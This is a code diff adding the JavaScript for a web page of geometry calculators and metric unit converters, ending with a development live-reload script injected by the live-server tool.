+        buttons[0].addEventListener("click", function() {
+            console.log(buttons[0].id);
+
+            let a = parseFloat(document.querySelector("#s1fa").value);
+            let b = parseFloat(document.querySelector("#s1fb").value);
+
+            document.querySelector("#s1fc").textContent = csquare(a,b);
+
+        });
+
+        }
+        else if(s1switch == 2){
+
+        document.getElementById("s1d1").style.display = "none";
+        document.getElementById("s1d2").style.display = "flex";
+        document.getElementById("s1d3").style.display = "none";
+
+        buttons[1].addEventListener("click", function() {
+
+            let c = parseFloat(document.querySelector("#s1sc").value);
+            let b = parseFloat(document.querySelector("#s1sb").value);
+
+            document.querySelector("#s1sa").textContent = asquare(c,b);
+
+        });
+
+        }
+        else{
+
+        document.getElementById("s1d3").style.display = "flex";
+        document.getElementById("s1d2").style.display = "none";
+        document.getElementById("s1d1").style.display = "none";
+
+        buttons[2].addEventListener("click", function() {
+
+            let c = parseFloat(document.querySelector("#s1tc").value);
+            let a = parseFloat(document.querySelector("#s1ta").value);
+
+            document.querySelector("#s1tb").textContent = asquare(c,a);
+
+        });
+
+        }
+        });
+
+        //section1_30----------------------------------------------------------------------------
+        let s1_30switch = document.querySelector("#s1_30val").value;
+        let s1_30buttons = [document.getElementById("s1_30b1"),document.getElementById("s1_30b2")];
+
+        function trigonometry_isosceles_sidea(c) {
+            return ((c/Math.sqrt(2)).toFixed(2));
+        }
+        function trigonometry_isosceles_sidec(a) {
+            return ((Math.sqrt(2)*a).toFixed(2));
+        }
+
+        document.getElementById("s1_30val").addEventListener('change', () => {
+
+
+        s1_30switch = document.querySelector("#s1_30val").value;
+
+        if(s1_30switch == 1){
+
+        document.getElementById("s1_30d1").style.display = "flex";
+        document.getElementById("s1_30d2").style.display = "none";
+
+        s1_30buttons[0].addEventListener("click", function() {
+
+            let a = parseFloat(document.querySelector("#s1_30fa").value);
+
+            document.querySelector("#s1_30fb").textContent = trigonometry_isosceles_sidec(a);
+
+        });
+
+        }
+        else{
+
+        document.getElementById("s1_30d1").style.display = "none";
+        document.getElementById("s1_30d2").style.display = "flex";
+
+        s1_30buttons[1].addEventListener("click", function() {
+
+            let a = parseFloat(document.querySelector("#s1_30sa").value);
+
+            document.querySelector("#s1_30sb").textContent = trigonometry_isosceles_sidea(a);
+
+        });
+
+        }
+
+        });
+
+        //section1_70----------------------------------------------------------------------------
+        let s1_70switch = document.querySelector("#s1_70val").value;
+        let s1_70buttons = [document.getElementById("s1_70b1"),document.getElementById("s1_70b2"),document.getElementById("s1_70b3")];
+
+        function trigonometry_right_sidea(c) {
+            return ((c/Math.sqrt(3)).toFixed(2));
+        }
+        function trigonometry_right_sidec(a) {
+            return ((Math.sqrt(3)*a).toFixed(2));
+        }
+
+
+        document.getElementById("s1_70val").addEventListener('change', () => {
+
+
+        s1_70switch = document.querySelector("#s1_70val").value;
+
+        if(s1_70switch == 1){
+
+        document.getElementById("s1_70d1").style.display = "flex";
+        document.getElementById("s1_70d2").style.display = "none";
+        document.getElementById("s1_70d3").style.display = "none";
+
+        s1_70buttons[0].addEventListener("click", function() {
+
+            let a = parseFloat(document.querySelector("#s1_70fa").value);
+
+            document.querySelector("#s1_70fb").textContent = (a*2).toFixed(2) + ' (2a)';
+            document.querySelector("#s1_70fc").textContent = trigonometry_right_sidec(a) + ' (√3*a)';
+
+        });
+
+        }
+        else if(s1_70switch == 2){
+
+        document.getElementById("s1_70d1").style.display = "none";
+        document.getElementById("s1_70d2").style.display = "flex";
+        document.getElementById("s1_70d3").style.display = "none";
+
+        s1_70buttons[1].addEventListener("click", function() {
+
+            let a = parseFloat(document.querySelector("#s1_70sb").value);
+
+            document.querySelector("#s1_70sa").textContent = (a/2).toFixed(2) + ' (a)';
+            document.querySelector("#s1_70sc").textContent = trigonometry_right_sidec(a/2) + ' (√3*a)';
+
+        });
+
+        }
+        else{
+
+        document.getElementById("s1_70d1").style.display = "none";
+        document.getElementById("s1_70d2").style.display = "none";
+        document.getElementById("s1_70d3").style.display = "flex";
+
+        s1_70buttons[2].addEventListener("click", function() {
+
+            let a = parseFloat(document.querySelector("#s1_70tc").value);
+
+            document.querySelector("#s1_70ta").textContent = trigonometry_right_sidea(a) + ' (a)';
+            document.querySelector("#s1_70tb").textContent = (trigonometry_right_sidea(a)*2).toFixed(2) + ' (2a)';
+
+        });
+
+        }
+
+        });
+
+
+        //section2----------------------------------------------------------------------------
+        let s2switch = document.querySelector("#s2val").value;
+        let s2buttons = [document.getElementById("s2b1"),document.getElementById("s2b2"),document.getElementById("s2b3")];
+
+            function trianglearia(base,sidea) {
+                return((base*sidea/2).toFixed(2));
+            }
+            function trianglebase(area,sidea) {
+                return((area*2/sidea).toFixed(2));
+            }
+
+
+            document.getElementById("s2val").addEventListener('change', () => {
+            
+            s2switch = document.querySelector("#s2val").value;
+
+            if (s2switch == 1) {
+                
+                document.getElementById("s2d1").style.display = "flex";
+                document.getElementById("s2d2").style.display = "none";
+                document.getElementById("s2d3").style.display = "none";
+
+                s2buttons[0].addEventListener("click", function() {
+                    let base = parseFloat(document.querySelector("#s2fbase").value);
+                    let sidea= parseFloat(document.querySelector("#s2fside-a").value);
+
+                    document.querySelector("#s2farea").textContent = trianglearia(base,sidea);
+
+                });
+            }
+            else if(s2switch == 2){
+
+                document.getElementById("s2d1").style.display = "none";
+                document.getElementById("s2d2").style.display = "flex";
+                document.getElementById("s2d3").style.display = "none";
+
+                s2buttons[1].addEventListener("click", function() {
+
+                    let area = parseFloat(document.querySelector("#s2sarea").value);
+                    let base = parseFloat(document.querySelector("#s2sbase").value);
+
+                    document.querySelector("#s2sside-a").textContent = trianglebase(area,base);
+
+        });
+
+        }
+        else{
+
+                document.getElementById("s2d1").style.display = "none";
+                document.getElementById("s2d2").style.display = "none";
+                document.getElementById("s2d3").style.display = "flex";
+
+                s2buttons[2].addEventListener("click", function() {
+
+                    let area = parseFloat(document.querySelector("#s2tarea").value);
+                    let sidea = parseFloat(document.querySelector("#s2tside-a").value);
+
+                    document.querySelector("#s2tbase").textContent = trianglebase(area,sidea);
+
+        });
+
+        }
+            });
+
+
+        //section2_70----------------------------------------------------------------------------
+        let s2_70switch = document.querySelector("#s2_70val").value;
+        let s2_70buttons = [document.getElementById("s2_70b1"),document.getElementById("s2_70b2"),document.getElementById("s2_70b3"), document.getElementById("s2_70b4")];
+
+        function triangleperimetera(a,b,c) {
+            return ((a+b+c).toFixed(2));
+        }
+        function triangleperimeterperi(a,b,peri) {
+            return ( Math.round((peri-(a+b)) * 100) / 100);
+        }
+
+
+        document.getElementById("s2_70val").addEventListener('change', () => {
+
+
+        s2_70switch = document.querySelector("#s2_70val").value;
+
+        if(s2_70switch == 1){
+
+        document.getElementById("s2_70d1").style.display = "flex";
+        document.getElementById("s2_70d2").style.display = "none";
+        document.getElementById("s2_70d3").style.display = "none";
+        document.getElementById("s2_70d4").style.display = "none";
+
+        s2_70buttons[0].addEventListener("click", function() {
+
+            let a = parseFloat(document.querySelector("#s2_70fa").value);
+            let b = parseFloat(document.querySelector("#s2_70fb").value);
+            let c = parseFloat(document.querySelector("#s2_70fc").value);
+
+            document.querySelector("#s2_70fperi").textContent = triangleperimetera(a,b,c);
+
+        });
+
+        }
+        else if(s2_70switch == 2){
+
+        document.getElementById("s2_70d1").style.display = "none";
+        document.getElementById("s2_70d2").style.display = "flex";
+        document.getElementById("s2_70d3").style.display = "none";
+        document.getElementById("s2_70d4").style.display = "none";
+
+        s2_70buttons[1].addEventListener("click", function() {
+
+            let b = parseFloat(document.querySelector("#s2_70sb").value);
+            let c = parseFloat(document.querySelector("#s2_70sc").value);
+            let peri = parseFloat(document.querySelector("#s2_70speri").value);
+
+            document.querySelector("#s2_70sb").style.marginLeft = '3px';
+            document.querySelector("#s2_70sa").style.marginRight = '12px';
+            document.querySelector("#s2_70sa").style.fontSize = '12px';
+            document.querySelector("#s2_70sa").textContent = triangleperimeterperi(b,c,peri);
+
+        });
+
+        }
+        else if(s2_70switch == 3){
+
+        document.getElementById("s2_70d1").style.display = "none";
+        document.getElementById("s2_70d2").style.display = "none";
+        document.getElementById("s2_70d3").style.display = "flex";
+        document.getElementById("s2_70d4").style.display = "none";
+
+        s2_70buttons[2].addEventListener("click", function() {
+
+            let a = parseFloat(document.querySelector("#s2_70ta").value);
+            let c = parseFloat(document.querySelector("#s2_70tc").value);
+            let peri = parseFloat(document.querySelector("#s2_70tperi").value);
+
+            document.querySelector("#s2_70tb").style.marginLeft = '5px';
+            document.querySelector("#s2_70tb").style.marginRight = '10px';
+            document.querySelector("#s2_70tb").style.fontSize = '12px';
+            document.querySelector("#s2_70tb").textContent = triangleperimeterperi(a,c,peri);
+
+        });
+
+        }
+        else{
+
+        document.getElementById("s2_70d1").style.display = "none";
+        document.getElementById("s2_70d2").style.display = "none";
+        document.getElementById("s2_70d3").style.display = "none";
+        document.getElementById("s2_70d4").style.display = "flex";
+
+        s2_70buttons[3].addEventListener("click", function() {
+
+            let a = parseFloat(document.querySelector("#s2_70foa").value);
+            let b = parseFloat(document.querySelector("#s2_70fob").value);
+            let peri = parseFloat(document.querySelector("#s2_70foperi").value);
+
+            document.querySelector("#s2_70foc").style.marginRight = '10px';
+            document.querySelector("#s2_70foc").style.marginLeft = '0';
+            document.querySelector("#s2_70foc").style.fontSize = '12px';
+            document.querySelector("#s2_70foc").textContent = triangleperimeterperi(a,b,peri);
+
+        });
+
+        }
+
+        });
+
+
+        //section3----------------------------------------------------------------------------
+        let s3switch = document.querySelector("#s3val").value;
+        let s3buttons = [document.getElementById("s3b1"),document.getElementById("s3b2")];
+
+        function circumference(r) {
+            return((2*3.14*r).toFixed(2));
+        }
+        function circumradius(circumf) {
+            return((circumf/(2*3.14)).toFixed(2));
+        }
+
+        document.getElementById("s3val").addEventListener("change", () => {
+
+            s3switch = document.querySelector("#s3val").value;
+
+            if (s3switch == 1) {
+                
+                document.getElementById("s3d1").style.display = "flex";
+                document.getElementById("s3d2").style.display = "none";
+
+                s3buttons[0].addEventListener("click", function() {
+
+                    let radius = parseFloat(document.querySelector("#s3fr").value);
+
+                    document.querySelector("#s3fcircumference").textContent = circumference(radius);
+
+                });
+
+
+            } 
+            else if(s3switch == 2){
+                
+                document.getElementById("s3d1").style.display = "none";
+                document.getElementById("s3d2").style.display = "flex";
+
+                s3buttons[1].addEventListener("click", function() {
+
+                    let circumference = parseFloat(document.querySelector("#s3scircumference").value);
+
+                    document.querySelector("#s3sr").textContent = circumradius(circumference);
+
+                });
+
+            }
+
+        });
+
+        
+        //section4----------------------------------------------------------------------------
+        let s4switch = document.querySelector("#s4val").value;
+        let s4buttons = [document.getElementById("s4b1"),document.getElementById("s4b2")];
+
+        function circlearea(r) {
+            return((3.14*r*r).toFixed(2));
+        }
+        function circle_a_radius(area) {
+            return(Math.sqrt(area/3.14).toFixed(2));
+        }
+
+        document.getElementById("s4val").addEventListener("change", () => {
+
+            s4switch = document.querySelector("#s4val").value;
+
+            if (s4switch == 1) {
+                
+                document.getElementById("s4d1").style.display = "flex";
+                document.getElementById("s4d2").style.display = "none";
+
+                s4buttons[0].addEventListener("click", function() {
+
+                    let radius = parseFloat(document.querySelector("#s4fr").value);
+
+                    document.querySelector("#s4farea").textContent = circlearea(radius);
+
+                });
+
+
+            } 
+            else if(s4switch == 2){
+                
+                document.getElementById("s4d1").style.display = "none";
+                document.getElementById("s4d2").style.display = "flex";
+
+                s4buttons[1].addEventListener("click", function() {
+
+                    let area = parseFloat(document.querySelector("#s4sarea").value);
+
+                    document.querySelector("#s4sr").textContent = circle_a_radius(area);
+
+                });
+
+            }
+
+        });
+
+
+        //section5----------------------------------------------------------------------------
+        let s5switch = document.querySelector("#s5val").value;
+        let s5buttons = [document.getElementById("s5b1"),document.getElementById("s5b2"),document.getElementById("s5b3")];
+
+        function rectanglearea(a,b) {
+            return((a*b).toFixed(2));
+        }
+        function rectangleside(area,side) {
+            return((area/side).toFixed(2));
+        }
+
+        document.getElementById("s5val").addEventListener("change", () => {
+
+            s5switch = document.querySelector("#s5val").value;
+
+            if(s5switch == 1){
+
+                document.getElementById("s5d1").style.display = "flex";
+                document.getElementById("s5d2").style.display = "none";
+                document.getElementById("s5d3").style.display = "none";
+
+                s5buttons[0].addEventListener("click", function() {
+
+                    let side_a = parseFloat(document.querySelector("#s5fa").value);
+                    let side_b = parseFloat(document.querySelector("#s5fb").value);
+
+                    document.querySelector("#s5farea").textContent = rectanglearea(side_a,side_b);
+
+                });
+
+            }
+            else if(s5switch == 2){
+
+                document.getElementById("s5d1").style.display = "none";
+                document.getElementById("s5d2").style.display = "flex";
+                document.getElementById("s5d3").style.display = "none";
+
+                s5buttons[1].addEventListener("click", function() {
+
+                    let area = parseFloat(document.querySelector("#s5sarea").value);
+                    let side_b = parseFloat(document.querySelector("#s5sb").value);
+
+                    document.querySelector("#s5sa").textContent = rectangleside(area,side_b);
+
+                });
+
+            }
+            else{
+
+                document.getElementById("s5d1").style.display = "none";
+                document.getElementById("s5d2").style.display = "none";
+                document.getElementById("s5d3").style.display = "flex";
+
+                s5buttons[2].addEventListener("click", function() {
+
+                    let area = parseFloat(document.querySelector("#s5tarea").value);
+                    let side_b = parseFloat(document.querySelector("#s5ta").value);
+
+                    document.querySelector("#s5tb").textContent = rectangleside(area,side_b); 
+
+                });
+
+            }
+
+        });
+
+        //section6----------------------------------------------------------------------------
+
+
+        //section7----------------------------------------------------------------------------
+        let s7switch = document.querySelector("#s7val").value;
+        let s7buttons = [document.getElementById("s7b1"),document.getElementById("s7b2"),document.getElementById("s7b3"),document.getElementById("s7b4")];
+
+        function trapeziumarea_1(height,a,b){
+            return((height*(a+b)/2 ).toFixed(2));
+        }
+        function trapeziumsidea_1(area,height,b){
+            return((2*area/height-b).toFixed(2));
+        }
+        function trapeziumheight_1(area,a,b){
+            return((2*area/(a+b)).toFixed(2));
+        }
+
+        document.getElementById("s7val").addEventListener("change", () => {
+
+            s7switch = document.querySelector("#s7val").value;
+
+            if (s7switch == 1){
+
+                document.getElementById("s7d1").style.display = "flex";
+                document.getElementById("s7d2").style.display = "none";
+                document.getElementById("s7d3").style.display = "none";
+                document.getElementById("s7d4").style.display = "none";
+
+                s7buttons[0].addEventListener("click", function() {
+
+                    let h = parseFloat(document.querySelector("#s7fheight").value);
+                    let a = parseFloat(document.querySelector("#s7fa").value);
+                    let b = parseFloat(document.querySelector("#s7fb").value);
+
+                    document.querySelector("#s7farea").textContent = trapeziumarea_1(h, a, b);
+
+                });
+
+            }
+            else if(s7switch == 2){
+
+                document.getElementById("s7d1").style.display = "none";
+                document.getElementById("s7d2").style.display = "flex";
+                document.getElementById("s7d3").style.display = "none";
+                document.getElementById("s7d4").style.display = "none";
+
+                s7buttons[1].addEventListener("click", function() {
+
+                    let h = parseFloat(document.querySelector("#s7sheight").value);
+                    let area = parseFloat(document.querySelector("#s7sarea").value);
+                    let b = parseFloat(document.querySelector("#s7sb").value);
+
+                    document.querySelector("#s7sa").style.fontSize = "13px";
+                    document.querySelector("#s7sa").textContent = trapeziumsidea_1(area,h,b);
+
+                });
+
+            }
+            else if(s7switch == 3){
+
+                document.getElementById("s7d1").style.display = "none";
+                document.getElementById("s7d2").style.display = "none";
+                document.getElementById("s7d3").style.display = "flex";
+                document.getElementById("s7d4").style.display = "none";
+
+                s7buttons[2].addEventListener("click", function() {
+
+                    let h = parseFloat(document.querySelector("#s7theight").value);
+                    let area = parseFloat(document.querySelector("#s7tarea").value);
+                    let a = parseFloat(document.querySelector("#s7ta").value);
+
+                    document.querySelector("#s7tb").style.fontSize = "13px";
+                    document.querySelector("#s7tb").textContent = trapeziumsidea_1(area,h,a);
+
+                });
+
+            }
+            else{
+
+                document.getElementById("s7d1").style.display = "none";
+                document.getElementById("s7d2").style.display = "none";
+                document.getElementById("s7d3").style.display = "none";
+                document.getElementById("s7d4").style.display = "flex";
+            
+                s7buttons[3].addEventListener("click", function() {
+
+                    let a = parseFloat(document.querySelector("#s7foa").value);
+                    let b = parseFloat(document.querySelector("#s7fob").value);
+                    let area = parseFloat(document.querySelector("#s7foarea").value);
+
+                    document.querySelector("#s7foheight").textContent = trapeziumheight_1(area,a,b);
+
+                });
+            
+            }
+
+        });
+
+        //section8----------------------------------------------------------------------------
+
+
+        //section_meterconventer----------------------------------------------------------------------------
+
+        function kilometerconventer(a){
+
+            document.querySelector("#inputmeter").value = (a*1000).toFixed(5);
+            document.querySelector("#inputcmeter").value = (a*100000).toFixed(5);
+            document.querySelector("#inputmmeter").value = (a*1000000).toFixed(5);
+
+        }
+
+        function meterconventer(a){
+
+            document.querySelector("#inputkmeter").value = (a/1000).toFixed(5);
+            document.querySelector("#inputcmeter").value = (a*100).toFixed(5);
+            document.querySelector("#inputmmeter").value = (a*1000).toFixed(5);
+
+        }
+
+        function centimeterconventer(a){
+
+            document.querySelector("#inputkmeter").value = (a/100000).toFixed(5);
+            document.querySelector("#inputmeter").value = (a/100).toFixed(5);
+            document.querySelector("#inputmmeter").value = (a*10).toFixed(5);
+
+        }
+
+        function millimeterconventer(a){
+
+            document.querySelector("#inputkmeter").value = (a/1000000).toFixed(5);
+            document.querySelector("#inputmeter").value = (a/1000).toFixed(5);
+            document.querySelector("#inputcmeter").value = (a/10).toFixed(5);
+
+        }
+
+
+        //section_metersqconventer----------------------------------------------------------------------------
+
+        function kilometersquareconventer(a){
+
+            document.querySelector("#inputmetersquare").value = (a*1000000).toFixed(5);
+            document.querySelector("#inputcmetersquare").value = (a*10000000000).toFixed(5);
+            document.querySelector("#inputmmetersquare").value = (a*1000000000000).toFixed(5);
+
+        }
+
+        function metersquareconventer(a){
+
+            document.querySelector("#inputkmetersquare").value = (a/1000000).toFixed(7);
+            document.querySelector("#inputcmetersquare").value = (a*10000).toFixed(5);
+            document.querySelector("#inputmmetersquare").value = (a*1000000).toFixed(3);
+
+        }
+
+        function centimetersquareconventer(a){
+
+            document.querySelector("#inputkmetersquare").value = (a/10000000000).toFixed(10);
+            document.querySelector("#inputmetersquare").value = (a/10000).toFixed(7);
+            document.querySelector("#inputmmetersquare").value = (a*100).toFixed(3);
+
+        }
+
+        function millimetersquareconventer(a){
+
+            document.querySelector("#inputkmetersquare").value = (a/1000000000000).toFixed(12);
+            document.querySelector("#inputmetersquare").value = (a/1000000).toFixed(10);
+            document.querySelector("#inputcmetersquare").value = (a/100).toFixed(7);
+
+        }
+
+        //section_literconventer----------------------------------------------------------------------------
+
+        function kiloliterconventer(a){
+
+            document.querySelector("#inputliter").value = (a*1000).toFixed(5);
+            document.querySelector("#inputcliter").value = (a*100000).toFixed(5);
+            document.querySelector("#inputmliter").value = (a*1000000).toFixed(5);
+
+        }
+
+        function literconventer(a){
+
+            document.querySelector("#inputkliter").value = (a/1000).toFixed(5);
+            document.querySelector("#inputcliter").value = (a*100).toFixed(5);
+            document.querySelector("#inputmliter").value = (a*1000).toFixed(5);
+
+        }
+
+        function centiliterconventer(a){
+
+            document.querySelector("#inputkliter").value = (a/100000).toFixed(5);
+            document.querySelector("#inputliter").value = (a/100).toFixed(5);
+            document.querySelector("#inputmliter").value = (a*10).toFixed(5);
+
+        }
+
+        function milliliterconventer(a){
+
+            document.querySelector("#inputkliter").value = (a/1000000).toFixed(5);
+            document.querySelector("#inputliter").value = (a/1000).toFixed(5);
+            document.querySelector("#inputcliter").value = (a/10).toFixed(5);
+
+        }
+
+
+        //section_gramconventer----------------------------------------------------------------------------
+
+        function kilogramconventer(a){
+
+            document.querySelector("#inputgram").value = (a*1000).toFixed(5);
+            document.querySelector("#inputcgram").value = (a*100000).toFixed(5);
+            document.querySelector("#inputmgram").value = (a*1000000).toFixed(5);
+
+        }
+
+        function gramconventer(a){
+
+            document.querySelector("#inputkgram").value = (a/1000).toFixed(5);
+            document.querySelector("#inputcgram").value = (a*100).toFixed(5);
+            document.querySelector("#inputmgram").value = (a*1000).toFixed(5);
+
+        }
+
+        function centigramconventer(a){
+
+            document.querySelector("#inputkgram").value = (a/100000).toFixed(5);
+            document.querySelector("#inputgram").value = (a/100).toFixed(5);
+            document.querySelector("#inputmgram").value = (a*10).toFixed(5);
+
+        }
+
+        function milligramconventer(a){
+
+            document.querySelector("#inputkgram").value = (a/1000000).toFixed(5);
+            document.querySelector("#inputgram").value = (a/1000).toFixed(5);
+            document.querySelector("#inputcgram").value = (a/10).toFixed(5);
+
+        }
+
+
+        //Physics Section ----------------------------------------------------------------------------------------------
+
+        //Physics Section 1----------------------------------------------------------------------------------------------
+        let fs1switch = document.querySelector("#physicss1val").value;
+        let fs1buttons = [document.getElementById("physicss1b1"),document.getElementById("physicss1b2")];
+
+
+        document.getElementById("physicss1val").addEventListener("change", () => {
+
+            fs1switch = document.querySelector("#physicss1val").value;
+
+            console.log(fs1switch)
+
+        })
+
+
+
+    </script>
+
+<!-- Code injected by live-server -->
+<script type="text/javascript">
+	// <![CDATA[  <-- For SVG support
+	if ('WebSocket' in window) {
+		(function () {
+			function refreshCSS() {
+				var sheets = [].slice.call(document.getElementsByTagName("link"));
+				var head = document.getElementsByTagName("head")[0];
+				for (var i = 0; i < sheets.length; ++i) {
+					var elem = sheets[i];
+					var parent = elem.parentElement || head;
+					parent.removeChild(elem);
+					var rel = elem.rel;
+					if (elem.href && typeof rel != "string" || rel.length == 0 || rel.toLowerCase() == "stylesheet") {
+						var url = elem.href.replace(/(&|\?)_cacheOverride=\d+/, '');
+						elem.href = url + (url.indexOf('?') >= 0 ? '&' : '?') + '_cacheOverride=' + (new Date().valueOf());
+					}
+					parent.appendChild(elem);
+				}
+			}
+			var protocol = window.location.protocol === 'http:' ? 'ws://' : 'wss://';
+			var address = protocol + window.location.host + window.location.pathname + '/ws';
+			var socket = new WebSocket(address);
+			socket.onmessage = function (msg) {
+				if (msg.data == 'reload') window.location.reload();
+				else if (msg.data == 'refreshcss') refreshCSS();
+			};
+			if (sessionStorage && !sessionStorage.getItem('IsThisFirstTime_Log_From_LiveServer')) {
+				console.log('Live reload enabled.');
+				sessionStorage.setItem('IsThisFirstTime_Log_From_LiveServer', true);
+			}
+		})();
+	}
+	else {
+		console.error('Upgrade your browser. This Browser is NOT supported WebSocket for Live-Reloading.');
+	}
+	// ]]>
+</script></body>
+</html>
